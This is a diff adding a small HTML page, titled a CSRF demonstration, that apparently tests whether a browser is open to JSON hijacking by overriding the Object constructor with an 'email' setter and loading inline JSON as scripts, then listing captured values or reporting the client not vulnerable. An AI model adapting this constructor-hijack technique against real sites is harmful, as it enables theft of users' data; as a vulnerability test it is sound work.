@@ -1,0 +1,44 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
+<html>
+    <head>
+        <title>CSRF demonstration</title>
+        <script type="text/javascript">
+            // bookkeeping for successful exploits
+            // (in separate script block in case the exploit doesn't parse)
+            capturedObjects = [];
+            function captureObject(x) { 
+              capturedObjects.push(x);
+            } 
+        </script>
+        <script type="text/javascript">
+            // The Fortify exploit
+            function Object() { 
+                this.email setter = captureObject; 
+            } 
+        </script>
+        <script type="text/javascript">
+        [{"email": "Array/Object JSON vulnerable"}]
+        </script>
+        <script type="text/javascript">
+        {"container": [{"email": "Object/Array/Object JSON vulnerable"}]}
+        </script>
+        <script type="text/javascript">
+        {"email": "Object JSON vulnerable"}
+        </script>
+    </head>
+    <body>
+    <script type="text/javascript">
+        var h1 = document.createElement("h1");
+        h1.appendChild(document.createTextNode(capturedObjects.length ? "Successful attacks:" : "Client not vulnerable"));
+        document.body.appendChild(h1);
+        var ul = document.createElement("ul");
+        for (var i = 0; i < capturedObjects.length; i++) {
+            var li = document.createElement("li");
+            li.appendChild(document.createTextNode(capturedObjects[i]));
+            ul.appendChild(li);
+        }
+        document.body.appendChild(ul);
+        document.body.appendChild(document.createTextNode(window.navigator.userAgent));
+    </script>
+    </body>
+</html>
